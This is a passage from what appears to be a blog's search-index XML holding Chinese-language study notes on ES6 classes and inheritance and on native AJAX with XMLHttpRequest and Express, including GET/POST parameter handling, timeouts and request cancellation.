 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">brand</span> = brand</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">price</span> = price</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 聲明父類的方法</span></span><br><span class="line">    <span class="title function_">call</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am calling&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPhone</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Phone</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(brand, price)     <span class="comment">// Phone.call(this, brand, price)</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span> = color</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">size</span> = size</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 聲明子類的方法</span></span><br><span class="line">    <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I can change the time&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Class &amp; Object</title>
    <url>/myBlog/2022/07/09/2022/2022-7-9-JS-Class&amp;Object/</url>
    <content><![CDATA[<h2 id="面向對象編程思想"><a href="#面向對象編程思想" class="headerlink" title="面向對象編程思想"></a>面向對象編程思想</h2><ol>
<li><p>面向過程編程POP (Process-oriented programming)</p>
<ul>
<li>分析出解決問題所需的步驟，然後同函數吧這些步驟一步步的實現，使用的時候再一個個的依照次序調用</li>
</ul>
</li>
<li><p>面向對象編程OOP (Object-oriented programming)</p>
<ul>
<li>把事務分解成為一個個對象，然後由對象之間分工與合作</li>
</ul>
</li>
<li><p>面向對象特性：</p>
<ul>
<li>封裝性 Encapsulation</li>
<li>繼承性 Inheritance</li>
<li>多態性 Polymorphism</li>
</ul>
</li>
</ol>
<h2 id="類與對象"><a href="#類與對象" class="headerlink" title="類與對象"></a>類與對象</h2><ol>
<li><p>面向對象思維特點：</p>
<ul>
<li>抽取對象共用的屬性和行為組織(方法)，封裝成一個類(模板)</li>
<li>對類進行實例化，獲取類的對象(通過這個類產生不同的對象)</li>
<li>考慮有哪些對象 &gt; 按照面向對象的思維模式創建對象 &gt; 使用對象去做事情</li>
</ul>
</li>
<li><p>JS中的對象(Object)：</p>
<ul>
<li>一組無序的相關屬性和方法的集合，所有的事物都是對象，例如字符串、數值、數組、函數等</li>
<li>對象是由屬性和方法組成的<ul>
<li><font color="#f54747">屬性</font>：事物的特徵，在對象中用 屬性 來表示</li>
<li><font color="#f54747">方法</font>：事物的行為，在對象中用 方法 來表示</li>
</ul>
</li>
</ul>
</li>
<li><p>JS中的類(Class)：</p>
<ul>
<li>在ES6中信增加的概念，使用<font color="#f54747">class</font>關鍵字聲明一個類，以這個類來實例化對象<ul>
<li><font color="#f54747">類</font>抽象了對象的公共部分，<font color="skyblue">泛指</font>某一個 大類</li>
<li><font color="#f54747">對象</font><font color="skyblue">特指</font>某一個通過類實例化的 具體對象</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="類的使用"><a href="#類的使用" class="headerlink" title="類的使用"></a>類的使用</h2><ol>
<li><p>創建類：</p>
<ul>
<li>通過<code>class</code>關鍵字創建類，類名是習慣性定義的首字母大寫</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// class body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Constructor 構造器：</p>
<ul>
<li><code>constructor()</code>方法是累的結構函數，<font color="#f54747">用於傳遞參數，返回實例對象</font></li>
<li>通過<code>new</code>命令生成對象實例時，自動調用該方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">uname</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建實例：</p>
<ul>
<li>通過<code>new</code>關鍵字創建實例</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xxx = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;uname&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>靜態成員：</p>
<ul>
<li>靜態屬性與方法是類獨有的，實例對象不可調用</li>
<li>通過<code>static</code>關鍵字聲明靜態屬性及方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 靜態屬性</span></span><br><span class="line"><span class="keyword">static</span> name = name</span><br><span class="line"><span class="comment">// 靜態方法</span></span><br><span class="line"><span class="keyword">static</span> <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="類的共有方法"><a href="#類的共有方法" class="headerlink" title="類的共有方法"></a>類的共有方法</h2><ol>
<li><p>創建方法：</p>
<ul>
<li>直接在對象裡添加方法</li>
<li>可以正常傳遞參數</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params">food</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">uname</span>, <span class="string">&#x27;like eating&#x27;</span>, food);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>語法規範：</p>
<ul>
<li>類裡面的所有函數不需要寫<code>function</code>關鍵字</li>
<li>多個函數與方法之間不需要添加<code>,</code></li>
</ul>
</li>
</ol>
<h2 id="繼承性"><a href="#繼承性" class="headerlink" title="繼承性"></a>繼承性</h2><ol>
<li><p><code>extends</code>關鍵字：</p>
<ul>
<li>用於讓子類繼承父類的屬性和方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">moeny</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>super</code>關鍵字：</p>
<ul>
<li>用於訪問和調用對象父類上的<font color="#f54747">構造器</font></li>
<li><font color="#f54747">注意：子類在構造器中使用super，則必須放到this的前面</font></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sum</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span> + <span class="variable language_">this</span>.<span class="property">y</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(x,y)  <span class="comment">// 調用父類的構造器</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必須後於super</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">subtract</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span> - <span class="variable language_">this</span>.<span class="property">y</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Override問題：</p>
<ul>
<li>繼承性中屬性和方法的查找原則：<ul>
<li>如果實例化子類輸出一個方法，則優先查看子類有沒有此方法，如果有就執行該方法，沒有就去父類中尋找</li>
</ul>
</li>
<li>使用<code>super</code>關鍵字訪問和調用對象父類上的<font color="#f54747">普通函數</font></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Parent&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// super.say() 就是調用父類中的普通函數 say()</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">super</span>.<span class="title function_">say</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="類與對象的注意點"><a href="#類與對象的注意點" class="headerlink" title="類與對象的注意點"></a>類與對象的注意點</h2><ol>
<li><p>因為在ES6中，類沒有變量提升，所以必須先安裝義類，才能通過實例化對象</p>
</li>
<li><p>類裡面的共有屬性和方法一定要加<code>this</code>關鍵字使用</p>
</li>
<li><p>類中this的指向問題</p>
<ul>
<li>在constructor中，this指向的是<font color="#f54747">實例對象</font></li>
<li>在方法中，this指向的是<font color="#f54747">方法的調用者</font></li>
</ul>
</li>
</ol>
<h2 id="類的本質"><a href="#類的本質" class="headerlink" title="類的本質"></a>類的本質</h2><ul>
<li><p>class本質上還是function，可以簡單的理解為是構造函數的另一種形式</p>
</li>
<li><p>類與構造函數的共同點：</p>
<ol>
<li>有原型對象<code>prototype</code></li>
<li>原型對象<code>prototype</code>裡面有<code>constructor</code>指向構造函數本身</li>
<li>可以通過原型對象添加方法</li>
<li>創建的實例對象有<code>__proto__</code>原型指向構造函數的原型對象</li>
</ol>
</li>
<li><p>所以ES6中類的絕大部分功能，ES5都可以做到，只是新的<code>class</code>寫法讓對象原型的寫法更加清晰，更像面向對象編程語法</p>
</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>AJAX</title>
    <url>/myBlog/2022/08/01/2022/2022-8-1-AJAX-Basic/</url>
    <content><![CDATA[<h1 id="原生AJAX"><a href="#原生AJAX" class="headerlink" title="原生AJAX"></a>原生AJAX</h1><ol>
<li><p>AJAX簡介：</p>
<ul>
<li>AJAX 全稱 Asynchronous Javascript And XML，就是異步的 JS 和 XML</li>
<li>通過 AJAX 可以再瀏覽器中向服務器發送異步請求，最大優勢：<font color="#f54747">頁面無刷新獲取數據</font></li>
<li>AJAX 不是新的編程語言，而是一種將現有的標準集合在一期使用的新方式</li>
</ul>
</li>
<li><p>XML簡介：</p>
<ul>
<li>XML 可擴展標記語言</li>
<li>XML 被設計用來傳輸和存儲數據</li>
<li>XML 和 HTML 類似，不同的是 HTML 仲都是預定義標籤，而 XML 仲沒有預定義標籤，都是自定義標籤，用來表示一些數據  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Donald<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">gender</span>&gt;</span>Male<span class="tag">&lt;/<span class="name">gender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>現在已經被 JSON 取代了  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Donald&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span> <span class="attr">&quot;gender&quot;</span><span class="punctuation">:</span><span class="string">&quot;Male&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>AJAX特點：</p>
<ul>
<li>優點：<ol>
<li>可以無需刷新頁面而與服務器進行通信</li>
<li>允許你根據用戶事件來更部分分頁內容</li>
</ol>
</li>
<li>缺點：<ol>
<li>沒有瀏覽史，不能回退</li>
<li>存在跨域問題（可解決）</li>
<li>SEO 不友好</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="AJAX基本使用"><a href="#AJAX基本使用" class="headerlink" title="AJAX基本使用"></a>AJAX基本使用</h2><ol>
<li><p>核心對象<br> <code>XMLHttpRequest</code> - AJAX的所有操作都是用過該對象進行</p>
</li>
<li><p>使用步驟：</p>
<ol>
<li><p>創建<code>XMLHttpRequest</code>實例對象</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定發送請求的：方法(<code>methods</code>)和地址(<code>url</code>)</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>發送請求</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>接收數據</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 綁定監聽狀態</span></span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 當監聽狀態等於 4 表示數據接收完畢</span></span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">// xhr.response 獲取數據</span></span><br><span class="line">        content.<span class="property">innerHTML</span> = <span class="string">`&lt;h3&gt;<span class="subst">$&#123;xhr.response&#125;</span>&lt;/h3&gt;`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="xhr內部的五種狀態"><a href="#xhr內部的五種狀態" class="headerlink" title="xhr內部的五種狀態"></a>xhr內部的五種狀態</h2><ul>
<li>5種狀態的值分別為：<code>0</code>、<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code><ul>
<li><code>0</code>：實例出來的那一刻（初始狀態）</li>
<li><code>1</code>：open已經調用了，但是send還沒有調用，此時可以修改請求頭內容</li>
<li><code>2</code>：send已經調用了，已經無法修改請求頭</li>
<li><code>3</code>：已經回來一部分數據，小的數據會在此階段一次性接收完畢，較大的數據有待進一步接收，<font color="#f54747">響應頭一定回來</font></li>
<li><code>4</code>：數據全部接收完畢</li>
</ul>
</li>
</ul>
<h2 id="GET請求"><a href="#GET請求" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>攜帶<code>query</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>query</code>參數 (<code>urlencoded</code>) 編碼形式：<code>key=value&amp;key=value</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get?name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.query</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_get/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>攜帶<code>params</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>params</code>參數形式：<code>xxx/xxx/Donald/18</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get/Donald/18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.params</code>屬性</li>
<li>地址配置佔位符 (<code>/:name/:age</code>)  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 佔位符</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_get/:name/:age&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="POST請求"><a href="#POST請求" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>攜帶<code>query</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>query</code>參數 (<code>urlencoded</code>) 編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post?name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.query</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>攜帶<code>params</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>params</code>參數形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post/Donald/18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.params</code>屬性</li>
<li>地址配置佔位符 (<code>/:name/:age</code>)  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 佔位符</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post/:name/:age&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用請求體的<code>urlencode</code>編碼形式</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>不需要在地址中添加  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>追加響應頭：</p>
<ul>
<li>用於表示攜帶請求體參數的<code>urlencode</code>編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發送請求：</p>
<ul>
<li>在發送請求時傳入參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>(<span class="string">&#x27;name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用中間件解析：</p>
<ul>
<li>引入中間件解析<code>urlencoded</code>編碼形式的請求體參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">true</span>&#125;))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.body</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">body</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用請求體的<code>json</code>編碼形式</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>不需要在地址中添加  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>追加響應頭：</p>
<ul>
<li>用於表示攜帶請求體參數的<code>json</code>編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發送請求：</p>
<ul>
<li>在發送請求時傳入參數</li>
<li><code>JSON.stringify</code>對象，讓其轉換為<code>JSON</code>字符串  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(person))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用中間件解析：</p>
<ul>
<li>引入中間件解析<code>json</code>編碼形式的請求體參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.body</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">body</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="解析JSON數據"><a href="#解析JSON數據" class="headerlink" title="解析JSON數據"></a>解析JSON數據</h2><ol>
<li><p>解析JSON格式數據：</p>
<ul>
<li>在獲取數據之後使用<code>JSON.parse</code>函數解析  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br></pre></td></tr></table></figure></li>
<li>問題：如果服務器返回的數據非 JSON 格式則會報錯</li>
</ul>
</li>
<li><p><code>xhr</code>的API解析JSON格式：</p>
<ul>
<li>配置<code>xhr.responseType</code>屬性為<code>json</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;json&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>服務器返回數據後就會進行 JSON 格式的解析，如果返回數據非 JSON 格式則<code>response</code>為<code>null</code></li>
</ul>
</li>
</ol>
<h2 id="請求異常與超時處理"><a href="#請求異常與超時處理" class="headerlink" title="請求異常與超時處理"></a>請求異常與超時處理</h2><ol>
<li><p>處理請求異常：</p>
<ul>
<li>使用<code>xhr.onerror</code>配置請求異常的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;Request Error&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>處理超時問題：</p>
<ul>
<li>使用<code>xhr.timeout</code>設置請求時限，如果超過時限則取消請求</li>
<li>使用<code>xhr.ontimeout</code>配置超時的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 超時時間</span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 超時的回調</span></span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;Request Timeout&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="取消請求"><a href="#取消請求" class="headerlink" title="取消請求"></a>取消請求</h2><ol>
<li><p>取消請求：</p>
<ul>
<li>使用<code>xhr.abort</code>函數可以取消該次請求  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">abort</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>工作原理：</p>
<ul>
<li>測試編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="title function_">abort</span>()</span><br></pre></td></tr></table></figure></li>
<li>如果發送請求之後立即取消請求，該次請求是有可能已經發送到服務器，但也獲取不到數據，因為瀏覽器會將服務器的響應攔截</li>
<li>簡而言之，然後速度夠快，在請求沒有發送到服務器之前被攔截並取消，如果請求發送到服務器，那麼瀏覽器也會攔截服務器的響應</li>
</ul>
</li>
</ol>
<h2 id="避免多次重複請求"><a href="#避免多次重複請求" class="headerlink" title="避免多次重複請求"></a>避免多次重複請求</h2><ul>
<li>配置一個<code>isLoading</code>屬性判斷請求是否發送中，如果發送中，再次發生請求則關閉上次的請求  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr</span><br><span class="line"><span class="keyword">let</span> isLoading</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(isLoading) xhr.<span class="title function_">abort</span>()   <span class="comment">// 如果發送請求中則取消該次請求</span></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>))&#123;</span><br><span class="line">            isLoading = <span class="literal">false</span>   <span class="comment">// 接收到數據後為 false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="title function_">send</span>()</span><br><span class="line">    isLoading = <span class="literal">true</span>    <span class="comment">// 發生請求後為 true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
